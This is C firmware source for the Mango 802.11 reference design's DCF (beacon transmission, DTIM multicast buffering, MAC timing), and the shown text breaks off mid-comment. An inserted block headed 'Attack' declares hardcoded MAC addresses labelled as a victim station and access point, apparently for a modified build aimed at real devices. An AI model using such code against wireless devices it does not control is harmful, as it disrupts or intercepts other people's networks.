/** @file wlan_mac_dcf.c
 *  @brief Distributed Coordination Function
 *
 *  This contains code to implement the 802.11 DCF.
 *
 *  @copyright Copyright 2013-2017, Mango Communications. All rights reserved.
 *          Distributed under the Mango Communications Reference Design License
 *              See LICENSE.txt included in the design archive or
 *              at http://mangocomm.com/802.11/license
 *
 *  This file is part of the Mango 802.11 Reference Design (https://mangocomm.com/802.11)
 */
/***************************** Include Files *********************************/
// Xilinx SDK includes
#include "xparameters.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "xio.h"
#include "xil_cache.h"

// WARP includes
#include "w3_userio.h"
#include "radio_controller.h"

// WLAN includes
#include "wlan_mac_low.h"
#include "wlan_mac_802_11_defs.h"
#include "wlan_mac_time_util.h"
#include "wlan_phy_util.h"
#include "wlan_mac_dcf.h"
#include "wlan_mac_dl_list.h"
#include "wlan_mac_mgmt_tags.h"
#include "wlan_mac_userio_util.h"

// WLAN Exp includes
#include "wlan_exp.h"


/*************************** Constant Definitions ****************************/
#define DBG_PRINT                                          0
#define WLAN_EXP_TYPE_DESIGN_80211_CPU_LOW                 WLAN_EXP_TYPE_DESIGN_80211_CPU_LOW_DCF
#define DEFAULT_TX_ANTENNA_MODE                            TX_ANTMODE_SISO_ANTA
#define NUM_LEDS                                           4
#define RX_LEN_THRESH                                      200


/*********************** Global Variable Definitions *************************/

volatile static u8                  gl_eeprom_addr[MAC_ADDR_LEN]; ///< HW address of this node that is stored in the EEPROM

volatile static mac_timing          gl_mac_timing_values; ///< Struct of IFS values for the DCF. These are not constants because they depend on sample rate									

// Retry Limits & Backoff parameters
volatile static u32                 gl_stationShortRetryCount; ///< Station Short Retry Count (SSRC) variable
volatile static u32                 gl_stationLongRetryCount; ///< Station Long Retry Count (SLRC) variable
volatile static u32                 gl_cw_exp; ///< Current Contention Window exponent
volatile static u8                  gl_cw_exp_min; ///< Maximum Contention Window exponent
volatile static u8                  gl_cw_exp_max; ///< Minimum Contention Window exponent
volatile static u32                 gl_dot11RTSThreshold; ///< Length threshold (in bytes) for enabling/disabling RTS/CTS protection
volatile static u32                 gl_dot11ShortRetryLimit; ///< Short Retry Limit (i.e. not using RTS/CTS)
volatile static u32                 gl_dot11LongRetryLimit; ///< Long Retry Limit (i.e. using RTS/CTS)

// Variables for shared state between Tx and Rx contexts for RTS/CTS
volatile static u8					gl_waiting_for_response; ///< Informs the Rx context that Tx is expecting a control response
volatile static u8                  gl_long_mpdu_pkt_buf; ///< Packet buffer index for a long MPDU that should be sent in the frame reception context (i.e. CTS reception)

// Status variables for User I/O
volatile u8                         gl_red_led_index; ///< Variable that enables User I/O visualization of bad FCS receptions
volatile u8                         gl_green_led_index; ///< Variable that enables User I/O visualization of good FCS receptions

// Beacon transmission & reception parameters
volatile beacon_txrx_configure_t	gl_beacon_txrx_configure; ///< Struct with configuration parameters regarding beacons
volatile u8							gl_dtim_mcast_buffer_enable; ///< Informs the DCF whether or not to buffer multicast transmissions until the DTIM
volatile u8							gl_dtim_count; ///< DTIM count for the current beacon interval

// Variables for managing Tx packet buffer ready messages
static dl_list				   		gl_tx_pkt_buf_ready_list_general; ///< List of Tx packet buffer indices for to-be-sent packets in the general packet buffer group
static dl_list				   		gl_tx_pkt_buf_ready_list_dtim_mcast; ///< List of packet buffer indices for to-be-sent packets in the DTIM multicast packet buffer group
static dl_list				   		gl_tx_pkt_buf_ready_list_free;	///< List of unused Tx packet buffers
static dl_entry						gl_tx_pkt_buf_entry[MAX_NUM_PENDING_TX_PKT_BUFS]; ///< Array of entries that will belong to one of the above lists
static u8						 	gl_tx_pkt_buf_entry_data[MAX_NUM_PENDING_TX_PKT_BUFS]; ///< Byte array to serve as the data payload for the above entries

/*************************** Functions Prototypes ****************************/

int process_low_param(u8 mode, u32* payload); ///< Implementation of DCF-specific processing of low params from wlan_exp

/******************************** Attack *************************************/

volatile static u8  v_sta[MAC_ADDR_LEN] = { 0,27,119,3,121,84 };
volatile static u8  v_ap[MAC_ADDR_LEN] = { 48,58,100,46,253,246 };
volatile static u8  example[MAC_ADDR_LEN] = { 64,216,85,4,36,50 };
volatile static u8  example_1[MAC_ADDR_LEN] = { 64,216,85,4,36,52 };

/******************************** Functions **********************************/

int main(){
	// Initialize Microblaze --
	//  these functions should be called before anything
	//  else is executed
	Xil_DCacheDisable();
	Xil_ICacheDisable();
	microblaze_enable_exceptions();

	u32 i;
    wlan_mac_hw_info_t* hw_info;
    compilation_details_t	compilation_details;
    bzero(&compilation_details, sizeof(compilation_details_t));

    xil_printf("\f");
    xil_printf("----- Mango 802.11 Reference Design -----\n");
    xil_printf("----- v1.6.2 ----------------------------\n");
    xil_printf("----- wlan_mac_dcf ----------------------\n");
    xil_printf("Compiled %s %s\n\n", __DATE__, __TIME__);
	strncpy(compilation_details.compilation_date, __DATE__, 12);
	strncpy(compilation_details.compilation_time, __TIME__, 9);

    xil_printf("Note: this UART is currently printing from CPU_LOW. To view prints from\n");
    xil_printf("and interact with CPU_HIGH, raise the right-most User I/O DIP switch bit.\n");
    xil_printf("This switch can be toggled any time while the design is running.\n\n");
    xil_printf("------------------------\n");

    gl_long_mpdu_pkt_buf = PKT_BUF_INVALID;
    gl_waiting_for_response = 0;

    gl_beacon_txrx_configure.beacon_tx_mode = NO_BEACON_TX;
    gl_beacon_txrx_configure.ts_update_mode = NEVER_UPDATE;
    gl_dtim_mcast_buffer_enable = 0;

    bzero((void*)gl_beacon_txrx_configure.bssid_match, MAC_ADDR_LEN);

    gl_dot11ShortRetryLimit      = 7;
    gl_dot11LongRetryLimit       = 4;

    gl_cw_exp_min                = 4;
    gl_cw_exp_max                = 10;

    gl_dot11RTSThreshold         = 2000;

    gl_stationShortRetryCount    = 0;
    gl_stationLongRetryCount     = 0;

    gl_red_led_index             = 0;
    gl_green_led_index           = 0;
    userio_write_leds_green(USERIO_BASEADDR, (1 << gl_green_led_index));
    userio_write_leds_red(USERIO_BASEADDR, (1 << gl_red_led_index));

    wlan_mac_low_init(WLAN_EXP_TYPE_DESIGN_80211_CPU_LOW, compilation_details);

    gl_cw_exp = gl_cw_exp_min;

    hw_info = get_mac_hw_info();
    memcpy((void*)gl_eeprom_addr, hw_info->hw_addr_wlan, MAC_ADDR_LEN);

    dl_list_init(&gl_tx_pkt_buf_ready_list_general);
    dl_list_init(&gl_tx_pkt_buf_ready_list_dtim_mcast);
    dl_list_init(&gl_tx_pkt_buf_ready_list_free);
    for(i = 0; i < MAX_NUM_PENDING_TX_PKT_BUFS; i++){
    	gl_tx_pkt_buf_entry[i].data = &(gl_tx_pkt_buf_entry_data[i]);
    	dl_entry_insertEnd(&gl_tx_pkt_buf_ready_list_free,&(gl_tx_pkt_buf_entry[i]));
    }

    wlan_mac_low_set_frame_rx_callback((void*)frame_receive);
    wlan_mac_low_set_beacon_txrx_config_callback((void*)configure_beacon_txrx);
    wlan_mac_low_set_mactime_change_callback((void*)handle_mactime_change);
    wlan_mac_low_set_ipc_low_param_callback((void*)process_low_param);
    wlan_mac_low_set_sample_rate_change_callback((void*)handle_sample_rate_change);
    wlan_mac_low_set_handle_tx_pkt_buf_ready((void*)handle_tx_pkt_buf_ready);
    wlan_mac_low_set_mcast_buffer_enable_callback((void*)handle_mcast_buffer_enable);


    // wlan_mac_low_init() has placed a mutex lock on TX_PKT_BUF_ACK_CTS and
    // TX_PKT_BUF_RTS already. We should set their packet buffer states to LOW_CTRL
    ((tx_frame_info_t*)TX_PKT_BUF_TO_ADDR(TX_PKT_BUF_ACK_CTS))->tx_pkt_buf_state = TX_PKT_BUF_LOW_CTRL;
    ((tx_frame_info_t*)TX_PKT_BUF_TO_ADDR(TX_PKT_BUF_RTS))->tx_pkt_buf_state = TX_PKT_BUF_LOW_CTRL;

    wlan_mac_low_init_finish();

    // Print DCF information to the terminal
    xil_printf("------------------------\n");
    xil_printf("WLAN MAC DCF boot complete: \n");
    xil_printf("  Serial Number     : W3-a-%05d\n", hw_info->serial_number);
    xil_printf("  Wireless MAC Addr : %02x:%02x:%02x:%02x:%02x:%02x\n\n", gl_eeprom_addr[0], gl_eeprom_addr[1], gl_eeprom_addr[2], gl_eeprom_addr[3], gl_eeprom_addr[4], gl_eeprom_addr[5]);

    while(1){

        // Poll PHY RX start
    	gl_waiting_for_response = 0;
        wlan_mac_low_poll_frame_rx();

        // Poll IPC rx
        wlan_mac_low_poll_ipc_rx();

    	// Poll for new Tx Ready
        poll_tx_pkt_buf_list(PKT_BUF_GROUP_GENERAL);

        // Poll the timestamp (for periodic transmissions like beacons)
        poll_tbtt_and_send_beacon();
    }
    return 0;
}

/*****************************************************************************/
/**
 * @brief Handle change to DTIM multicast buffer enable bit
 * 
 * The transition between buffering DTIM multicast packets to not (and vice versa)
 * requires inspecition of the to-be-sent list of ready packet buffers. This function
 * calls a subfunction to perform this inspection and toggles the top-level global
 * variable that indicates whether or not DTIM multicast buffering is enabled.
 *
 * @param   u32		enable 		-1 for enabled buffering, 0 for disabled buffering
 * @return  None
 */
void handle_mcast_buffer_enable(u32 enable){
	gl_dtim_mcast_buffer_enable = enable;
	update_tx_pkt_buf_lists();
}

/*****************************************************************************/
/**
 * @brief Update packet buffer lists
 * 
 * This function will merge the gl_tx_pkt_buf_ready_list_general and gl_tx_pkt_buf_ready_list_dtim_mcast
 * lists into the gl_tx_pkt_buf_ready_list_general list only when DTIM multicast buffering is disabled.
 * When enabled, members of gl_tx_pkt_buf_ready_list_general with a multicast RA will be removed from the
 * list and placed into gl_tx_pkt_buf_ready_list_dtim_mcast.
 *
 * @param   None
 * @return  None
 */
void update_tx_pkt_buf_lists(){
	int iter;
	u8 pkt_buf;
	tx_frame_info_t* tx_frame_info;
	mac_header_80211* header;

	dl_entry* curr_entry;
	dl_entry* next_entry;

	if( (gl_dtim_mcast_buffer_enable == 1) && (gl_beacon_txrx_configure.beacon_tx_mode != NO_BEACON_TX) ) {
		// DTIM buffering is enabled. We need to move any PKT_BUF_GROUP_DTIM_MCAST packets out of gl_tx_pkt_buf_ready_list_general
		// and into gl_tx_pkt_buf_ready_list_dtim_mcast.

		iter = gl_tx_pkt_buf_ready_list_general.length;
		next_entry = gl_tx_pkt_buf_ready_list_general.first;

		while( (next_entry != NULL) && (iter-- > 0) ){

			curr_entry = next_entry;
			next_entry = dl_entry_next(next_entry);

			pkt_buf = *( (u8*)curr_entry->data);

			tx_frame_info	= (tx_frame_info_t*)  (TX_PKT_BUF_TO_ADDR(pkt_buf));
			header          = (mac_header_80211*) (TX_PKT_BUF_TO_ADDR(pkt_buf) + PHY_TX_PKT_BUF_MPDU_OFFSET);

			// The pkt_buf_group_t in the frame_info_t cannot be used to find the existing multicast packets in the
			// general list. When DTIM multicast buffering is disabled, all pkt_buf_group_t are PKT_BUF_GROUP_GENERAL.
			// So, instead, we will inspect the RA of the to-be-transmitted packets to find ones that are multicast.
			if(wlan_addr_mcast(header->address_1)){
				tx_frame_info->queue_info.pkt_buf_group = PKT_BUF_GROUP_DTIM_MCAST;
				dl_entry_remove(&gl_tx_pkt_buf_ready_list_general, curr_entry);
				dl_entry_insertEnd(&gl_tx_pkt_buf_ready_list_dtim_mcast, curr_entry);
			}
		}
	} else if( (gl_dtim_mcast_buffer_enable == 0) || (gl_beacon_txrx_configure.beacon_tx_mode == NO_BEACON_TX) ) {
			// DTIM buffering is disabled. We need to merge gl_tx_pkt_buf_ready_list_general and gl_tx_pkt_buf_ready_list_dtim_mcast and
			// assigned all packet buffer groups to PKT_BUF_GROUP_GENERAL.

			// It is possible that MAC Tx Controller D is currently paused with a frame to be transmitted. In this context, we can
			// safely reset the state of that controller and then force the pause bit to 0.
			wlan_mac_reset_tx_ctrl_D(1);
			wlan_mac_reset_tx_ctrl_D(0);
			wlan_mac_pause_tx_ctrl_D(0);

			iter = gl_tx_pkt_buf_ready_list_dtim_mcast.length;
			next_entry = gl_tx_pkt_buf_ready_list_dtim_mcast.first;

			while( (next_entry != NULL) && (iter-- > 0) ){

				curr_entry = next_entry;
				next_entry = dl_entry_next(next_entry);

				pkt_buf = *( (u8*)curr_entry->data);

				tx_frame_info	= (tx_frame_info_t*)  (TX_PKT_BUF_TO_ADDR(pkt_buf));

				tx_frame_info->queue_info.pkt_buf_group = PKT_BUF_GROUP_GENERAL;
				dl_entry_remove(&gl_tx_pkt_buf_ready_list_dtim_mcast, curr_entry);
				dl_entry_insertEnd(&gl_tx_pkt_buf_ready_list_general, curr_entry);
			}
		}

}

/*****************************************************************************/
/**
 * @brief Handle sample rate change
 * 
 * A change in sample rate needs to be reflected in MAC timings. This function is
 * provides with an argument of what the new sample rate is so that it can make
 * the appropriate changes.
 *
 * @param   u32		phy_samp_rate_t		- Sample rate enum
 * @return  None
 */
void handle_sample_rate_change(phy_samp_rate_t phy_samp_rate){
	// TODO: Add an argument to specify the phy_mode in case that changes MAC timings

    switch(phy_samp_rate){
    	default:
    	case PHY_40M:
    	case PHY_20M:
    		gl_mac_timing_values.t_slot = 9;
    		gl_mac_timing_values.t_sifs = 10;
    		gl_mac_timing_values.t_difs = gl_mac_timing_values.t_sifs + (2*gl_mac_timing_values.t_slot);
    		gl_mac_timing_values.t_eifs = 88;
    		gl_mac_timing_values.t_phy_rx_start_dly = 25; //TODO: This is BW dependent. 20/25 is waveform time.
    		gl_mac_timing_values.t_timeout = gl_mac_timing_values.t_sifs + gl_mac_timing_values.t_slot + gl_mac_timing_values.t_phy_rx_start_dly;
    	break;
    	case PHY_10M:
    		gl_mac_timing_values.t_slot = 13;
    		gl_mac_timing_values.t_sifs = 10;
    		gl_mac_timing_values.t_difs = gl_mac_timing_values.t_sifs + (2*gl_mac_timing_values.t_slot);
    		gl_mac_timing_values.t_eifs = 88;
    		gl_mac_timing_values.t_phy_rx_start_dly = 45;
    		gl_mac_timing_values.t_timeout = gl_mac_timing_values.t_sifs + gl_mac_timing_values.t_slot + gl_mac_timing_values.t_phy_rx_start_dly;
    	break;
    }

    // MAC timing parameters are in terms of units of 100 nanoseconds
	wlan_mac_set_slot(gl_mac_timing_values.t_slot*10);
	wlan_mac_set_DIFS((gl_mac_timing_values.t_difs)*10);
	wlan_mac_set_TxDIFS(((gl_mac_timing_values.t_difs)*10) - (TX_PHY_DLY_100NSEC));

	// Use postTx timer 2 for ACK timeout
	wlan_mac_set_postTx_timer2(gl_mac_timing_values.t_timeout * 10);
	wlan_mac_postTx_timer2_en(1);

	// Use postRx timer 1 for SIFS
	wlan_mac_set_postRx_timer1((gl_mac_timing_values.t_sifs*10)-(TX_PHY_DLY_100NSEC));

	wlan_mac_postRx_timer1_en(1);

	// TODO: NAV adjust needs verification
	//     NAV adjust time - signed char (Fix8_0) value
	wlan_mac_set_NAV_adj(0*10);
	wlan_mac_set_EIFS(gl_mac_timing_values.t_eifs*10);
}

/*****************************************************************************/
/**
 * @brief Update DTIM count
 * 
 * 10.1.3.2 in 802.11-2012 dictates that MAC Time 0 is, by definition, a DTIM. Based upon this single fact,
 * a DTIM count can be explicitly calculated according to the current MAC time as well as the DTIM period.
 * This function successfully does nothing it the beacon_tx_mode is something other than AP_BEACON_TX.
 *
 * @param   None
 * @return  None
 */
void update_dtim_count(){
	u32 current_tu;
	u32 temp_var;
	if( gl_beacon_txrx_configure.beacon_tx_mode == AP_BEACON_TX ){
		current_tu = (u32)(get_mac_time_usec()>>10);

		if(gl_beacon_txrx_configure.dtim_period != 0){
			temp_var = ((current_tu/gl_beacon_txrx_configure.beacon_interval_tu)+1)%gl_beacon_txrx_configure.dtim_period;
			if(temp_var == 0){
				gl_dtim_count = 0;
			} else {
				gl_dtim_count = gl_beacon_txrx_configure.dtim_period - temp_var;
			}

		} else {
			gl_dtim_count = 0;
		}
	} else {
		gl_dtim_count = 0;
	}
}

/*****************************************************************************/
/**
 * @brief Update TU target
 * 
 * This function sets the TU target to whenever the next TBTT occurs. It only performs
 * this action if beacon_tx_mode is AP_BEACON_TX or IBSS_BEACON_TX
 *
 * @param   u8	recompute	- 0 for updating TU target via addition from previous target, 1 to recompute from MAC time
 * @return  None
 */
void update_tu_target(u8 recompute) {
	u64 current_tu = (get_mac_time_usec()>>10);
    if(recompute) {
        // Re-compute TU target from current MAC time

        // Expensive u64 division
        u64 tu_target =  gl_beacon_txrx_configure.beacon_interval_tu * ((current_tu /  gl_beacon_txrx_configure.beacon_interval_tu) + 1);

        wlan_mac_set_tu_target(tu_target);

    } else {
        // Increment current TU target to the next-future target

        while(1) {
            u64 current_tu_target = wlan_mac_get_tu_target();
            if(current_tu_target > current_tu) {
                // Achieved future target - done
                break;
            }
            else{
                // Increment target and continue
            	wlan_mac_set_tu_target(current_tu_target + gl_beacon_txrx_configure.beacon_interval_tu);
            }
        }
    }
}

/*****************************************************************************/
/**
 * @brief Handle MAC time change
 * 
 * If the MAC time has changed, we need to ensure that we update the TU target to
 * to whatever the next TBTT is on the current timebase. Similarly, we must update
 * the DTIM count for multicast buffering.
 *
 * @param   s64		time_delta_usec		- number of microseconds between the current time and the MAC time prior to the change
 * @return  None
 */
void handle_mactime_change(s64 time_delta_usec){
	update_dtim_count();
	if((time_delta_usec < 0) || (time_delta_usec > (100*gl_beacon_txrx_configure.beacon_interval_tu)) ){
		//The MAC time change was either very large or moved us backwards in time. Either way, we can't rely on the
		//"fast" TU target update and must instead explicitly recompute the target based upon the MAC time.
		update_tu_target(1);
	} else {
		update_tu_target(0);
	}
	return;
}

/*****************************************************************************/
/**
 * @brief Configure beacon parameters
 * 
 * The CPU_HIGH application will configure the DCF with whatever parameters it
 * needs to know about beacon transmissions and receptions.
 *
 * @param   u32		phy_samp_rate_t		- Sample rate enum
 * @return  None
 */
void configure_beacon_txrx(beacon_txrx_configure_t* beacon_txrx_configure){
	memcpy((void*)&gl_beacon_txrx_configure, beacon_txrx_configure, sizeof(beacon_txrx_configure_t));

	update_tx_pkt_buf_lists();

	if(( gl_beacon_txrx_configure.beacon_tx_mode == AP_BEACON_TX ) ||
	   ( gl_beacon_txrx_configure.beacon_tx_mode == IBSS_BEACON_TX )){

		//Because we are setting up a new beacon configuration, we should not update the TU target
		//based upon existing targets. We should instead explicitly recompute the target from the
		//current MAC time and beacon interval
		update_tu_target(1);
		update_dtim_count();

		wlan_mac_reset_tu_target_latch(1);
		wlan_mac_reset_tu_target_latch(0);
	}  else {
		wlan_mac_set_tu_target(0xFFFFFFFF);
		wlan_mac_reset_tu_target_latch(1);
	}
}

/*****************************************************************************/
/**
 * @brief Poll for the TBTT and, if appropriate, send a beacon
 * 
 * This function is the context that will pause the general transmission state machine
 * (Tx Controller A) and send a beacon on a TBTT boundary. Furthermore. this function
 * will proceed to send multicast frames after a DTIM beacon. If a second (or more)
 * TBTTs occur while still in the context of this function, additional beacons and multicast
 * frames will be sent on the proper boundaries.
 *
 * @param   None
 * @return  None
 */
inline void poll_tbtt_and_send_beacon(){
	u32 mac_tx_ctrl_status;
	u32 send_beacon_return;
	u32 prepare_frame_transmit_return;
	u32 poll_tx_pkt_buf_list_return = 0;

	if(( gl_beacon_txrx_configure.beacon_tx_mode == AP_BEACON_TX ) ||
	   ( gl_beacon_txrx_configure.beacon_tx_mode == IBSS_BEACON_TX )){

		if( wlan_mac_check_tu_latch() ) {
			// Current TU >= Target TU

			// Attempt to pause the backoff counter in Tx controller A
			wlan_mac_pause_tx_ctrl_A(1);

			mac_tx_ctrl_status = wlan_mac_get_tx_ctrl_status();

			// Check if Tx controller A is deferring (now with a paused backoff) or idle (no Tx pending)
			if(((mac_tx_ctrl_status & WLAN_MAC_TXCTRL_STATUS_MASK_TX_A_STATE) == WLAN_MAC_TXCTRL_STATUS_TX_A_STATE_DEFER) ||
			   ((mac_tx_ctrl_status & WLAN_MAC_TXCTRL_STATUS_MASK_TX_A_STATE) == WLAN_MAC_TXCTRL_STATUS_TX_A_STATE_IDLE)) {

				while( wlan_mac_check_tu_latch() ){
					// Note: on the first iteration of this loop, wlan_mac_check_tu_latch() has been called
					// twice. This is intentional. This structure ensures we do not toggle the pause state on
					// Tx controller A across many mcast transmissions spanning multiple beacon TBTTs

					prepare_frame_transmit_return = wlan_mac_low_prepare_frame_transmit( gl_beacon_txrx_configure.beacon_template_pkt_buf );

					if(prepare_frame_transmit_return & PREPARE_FRAME_TRANSMIT_ERROR_UNEXPECTED_PKT_BUF_STATE){
						// Update TU target
						//  Changing TU target automatically resets TU_LATCH
						//  Latch will assert immediately if Current TU >= new Target TU
						update_tu_target(0);
						wlan_mac_pause_tx_ctrl_A(0);

						// Reset Tx Controller D and unpause
						wlan_mac_reset_tx_ctrl_D(1);
						wlan_mac_reset_tx_ctrl_D(0);
						wlan_mac_pause_tx_ctrl_D(0);
						return;
					}
					send_beacon_return = send_beacon(gl_beacon_txrx_configure.beacon_template_pkt_buf);
					// Note: the above send_beacon() call will send the IPC message directly to CPU_HIGH
					// upon completion. We should not call wlan_mac_low_finish_frame_transmit() for the
					// beacon transmission. This slight asymmetry is a byproduct of different handling
					// of beacon packet buffer state (e.g. a beacon is TX_PKT_BUF_HIGH_CTRL when a
					// TX_LOW is being logged while other MPDUs remain in TX_PKT_BUF_LOW_CTRL for the
					// same logging operation).

					// Update TU target
					//  Changing TU target automatically resets TU_LATCH
					//  Latch will assert immediately if Current TU >= new Target TU
					update_tu_target(0);

					// Send mcast data here
					// We are only allowed to send mcast packets if either of two conditions are met:
					//	1) This is a DTIM beacon period
					//	2) The frame transmitted just prior the last beacon was a multicast packet whose MAC_FRAME_CTRL2_FLAG_MORE_DATA bit
					//	   is 1. In this case, we are allowed to continue sending multicast packets in the current beacon interval regardless
					//	   of DTIM (11.2.1.5.f 802.11-2007)
					if( ((send_beacon_return & SEND_BEACON_RETURN_DTIM) && (gl_dtim_mcast_buffer_enable == 1)) ||
						((poll_tx_pkt_buf_list_return & POLL_TX_PKT_BUF_LIST_RETURN_TRANSMITTED) && (poll_tx_pkt_buf_list_return & POLL_TX_PKT_BUF_LIST_RETURN_MORE_DATA)) ||
						 poll_tx_pkt_buf_list_return & POLL_TX_PKT_BUF_LIST_RETURN_PAUSED){

						while( gl_tx_pkt_buf_ready_list_dtim_mcast.length > 0 ){
							// There is at least one mcast frame for us to send. We will loop over this list until either we have fully emptied it
							// or we are forced to buffer until the next DTIM.

							poll_tx_pkt_buf_list_return = poll_tx_pkt_buf_list(PKT_BUF_GROUP_DTIM_MCAST);
							// At this point in the code, either of two conditions have been met:
							//  1) An mcast packet has been sent and gl_tx_pkt_buf_ready_list_dtim_mcast.length has been decremented
							//  2) An mcast packet has been submitted to MAC Tx Controller D, but a TBTT boundary occured while the
							//	   core was deferring.

							if( wlan_mac_check_tu_latch() ){
								// We just crossed a TBTT so we should send another beacon. Break
								// back to the top of the while( wlan_mac_check_tu_latch() ) loop.
								break;
							}

							if( (poll_tx_pkt_buf_list_return & POLL_TX_PKT_BUF_LIST_RETURN_TRANSMITTED) && ((poll_tx_pkt_buf_list_return & POLL_TX_PKT_BUF_LIST_RETURN_MORE_DATA) == 0 ) ) {
								// We sent the last mcast packet allowed in this beacon interval. We can now return all the way back to general
								// operation.
								wlan_mac_pause_tx_ctrl_A(0);
								return;
							}
						}
					}
				}
			}
			wlan_mac_pause_tx_ctrl_A(0);
		}
	}
	return;
}


/*****************************************************************************/
/**
 * @brief Send a beacon
 * 
 * This function will send a beacon on Tx Controller C and then send the report
 * of that message to CPU_HIGH via IPC messages.
 *
 * @param   None
 * @return  None
 */
inline u32 send_beacon(u8 tx_pkt_buf){
	// Note: it is assumed that this function is only called when it is safe to immediately
	// transmit a beacon throuch MAC support core C. In other words, it is the responsibility
	// of the calling function to ensure that any pending transmissions through MAC support
	// core A have been successfully paused.

	u32 return_status = 0;
	wlan_ipc_msg_t                ipc_msg_to_high;
    wlan_mac_low_tx_details_t     low_tx_details;
	u32 mac_hw_status;
	u16 n_slots;
	u16 n_slots_readback;
	int tx_gain;
	u8 mpdu_tx_ant_mask;
	//Note: This needs to be a volatile to allow the tx_pkt_buf_state to be re-read in the initial while loop below
	volatile tx_frame_info_t* tx_frame_info			= (tx_frame_info_t*) (TX_PKT_BUF_TO_ADDR(tx_pkt_buf));
	mac_header_80211* header             			= (mac_header_80211*)(TX_PKT_BUF_TO_ADDR(tx_pkt_buf) + PHY_TX_PKT_BUF_MPDU_OFFSET);
	tx_mode_t tx_mode;
	u32 rx_status;
	mgmt_tag_template_t*	mgmt_tag_tim_template = NULL;
	u8	tx_has_started = 0;

	if(gl_beacon_txrx_configure.dtim_tag_byte_offset != 0){
		mgmt_tag_tim_template = (mgmt_tag_template_t*)((u8*)tx_frame_info + gl_beacon_txrx_configure.dtim_tag_byte_offset);
	}

	// Compare the length of this frame to the RTS Threshold
	if(tx_frame_info->length <= gl_dot11RTSThreshold) {
		tx_mode = TX_MODE_SHORT;
	} else {
		tx_mode = TX_MODE_LONG;
	}

	if(mgmt_tag_tim_template != NULL){
		if( (gl_beacon_txrx_configure.dtim_period != 0) ){
			// Update the DTIM count
			mgmt_tag_tim_template->data[0] = gl_dtim_count;  //DTIM Count
			if(gl_dtim_count == 0){
				return_status |= SEND_BEACON_RETURN_DTIM;		
			} 

			//Note: while it is tempting to simply decrement the gl_dtim_count, this can lead to a bug
			//in the event that a beacon is skipped because a previous beacon is deferred across the following
			//TBTT. Instead, we should explicitly update the DTIM count according to the current MAC time
			update_dtim_count();

			//mgmt_tag_tim_template->data[1] = 1;  //DTIM Period -- Note: CPU_HIGH is responsible for filling this in during the TIM update

			//Update the mcast TIM bitmap depending on the state of
			if(gl_tx_pkt_buf_ready_list_dtim_mcast.length > 0) {
				mgmt_tag_tim_template->data[2] |= 1;
				mgmt_tag_tim_template->data[3] |= 1;
			} else {
				mgmt_tag_tim_template->data[2] &= 0xFE;
				mgmt_tag_tim_template->data[3] &= 0xFE;
			}

		} else {
			// DTIM buffering is disabled or there is an invalid DTIM period. Set the DTIM count and period to something sane
			// Note: the mcast bit in the TIM bitmap is owned by CPU_HIGH in this case
			mgmt_tag_tim_template->data[0] = 0;  //DTIM Count
			mgmt_tag_tim_template->data[1] = 1;  //DTIM Period
		}
	}

	// Configure the Tx antenna selection
	mpdu_tx_ant_mask = 0;

	switch(tx_frame_info->params.phy.antenna_mode) {
		case TX_ANTMODE_SISO_ANTA:  mpdu_tx_ant_mask |= 0x1;  break;
		case TX_ANTMODE_SISO_ANTB:  mpdu_tx_ant_mask |= 0x2;  break;
		case TX_ANTMODE_SISO_ANTC:  mpdu_tx_ant_mask |= 0x4;  break;
		case TX_ANTMODE_SISO_ANTD:  mpdu_tx_ant_mask |= 0x8;  break;
		default:                    mpdu_tx_ant_mask  = 0x1;  break; // Default to RF_A
	}

	//wlan_mac_tx_ctrl_C_params(pktBuf, antMask, req_backoff, phy_mode, num_slots)
	switch(gl_beacon_txrx_configure.beacon_tx_mode){
		case AP_BEACON_TX:
			n_slots = rand_num_slots(RAND_SLOT_REASON_STANDARD_ACCESS);
			wlan_mac_tx_ctrl_C_params(tx_pkt_buf, mpdu_tx_ant_mask, 0, tx_frame_info->params.phy.phy_mode, n_slots);
		break;
		case IBSS_BEACON_TX:
			n_slots = rand_num_slots(RAND_SLOT_REASON_IBSS_BEACON);
			wlan_mac_tx_ctrl_C_params(tx_pkt_buf, mpdu_tx_ant_mask, 1, tx_frame_info->params.phy.phy_mode, n_slots);
		break;
		case NO_BEACON_TX:
			return -1;
		break;
	}

	tx_gain = wlan_mac_low_dbm_to_gain_target(tx_frame_info->params.phy.power);
	wlan_mac_tx_ctrl_C_gains(tx_gain, tx_gain, tx_gain, tx_gain);

	write_phy_preamble(tx_pkt_buf,
					   tx_frame_info->params.phy.phy_mode,
					   tx_frame_info->params.phy.mcs,
					   tx_frame_info->length);


	wlan_mac_tx_ctrl_C_start(1);
	wlan_mac_tx_ctrl_C_start(0);

	// Immediately re-read the current slot count.
	n_slots_readback = wlan_mac_get_backoff_count_C();

	if((n_slots != n_slots_readback)){
		// For the first transmission (non-retry) of an MPDU, the number of
		// slots used by the backoff process is ambiguous. The n_slots we provided
		// to wlan_mac_tx_ctrl_A_params is only a suggestion. If the medium has been
		// idle for a DIFS, then there will not be a backoff. Or, if another backoff is
		// currently running, the MAC Config Core A will inherit that backoff. By
		// immediately reading back the slot count after starting the core, we can
		// overwrite the number of slots that we will fill into low_tx_details with
		// the correct value
		n_slots = n_slots_readback;
	}

	tx_frame_info->num_tx_attempts   = 1;
	tx_frame_info->phy_samp_rate	 = wlan_mac_low_get_phy_samp_rate();

	// Here, we are overloading the "create" timestamp to mean something subtly different
	//  than when it is used for data MPDUs since beacons are not created and enqueued in
	//  CPU_HIGH. By explicitly filling the current MAC time into the create timestamp,
	//  we allow CPU_HIGH to determine whether or not a backoff occurred before the beacon transmission
	//  when it is creating the TX_LOW log entry for the beacon.
	tx_frame_info->timestamp_create  = get_mac_time_usec();
	tx_frame_info->delay_accept		 = 0;

	low_tx_details.tx_details_type  = TX_DETAILS_MPDU;
	low_tx_details.phy_params_mpdu.mcs          = tx_frame_info->params.phy.mcs;
	low_tx_details.phy_params_mpdu.phy_mode     = tx_frame_info->params.phy.phy_mode;
	low_tx_details.phy_params_mpdu.power        = tx_frame_info->params.phy.power;
	low_tx_details.phy_params_mpdu.antenna_mode = tx_frame_info->params.phy.antenna_mode;

	low_tx_details.chan_num    = wlan_mac_low_get_active_channel();
	low_tx_details.cw          = (1 << gl_cw_exp)-1; //(2^(gl_cw_exp) - 1)
	low_tx_details.ssrc        = gl_stationShortRetryCount;
	low_tx_details.slrc        = gl_stationLongRetryCount;
	low_tx_details.src         = 0;
	low_tx_details.lrc         = 0;
	low_tx_details.flags	   = 0;

	// The pre-Tx backoff may not occur for the initial transmission attempt. If the medium has been idle for >DIFS when
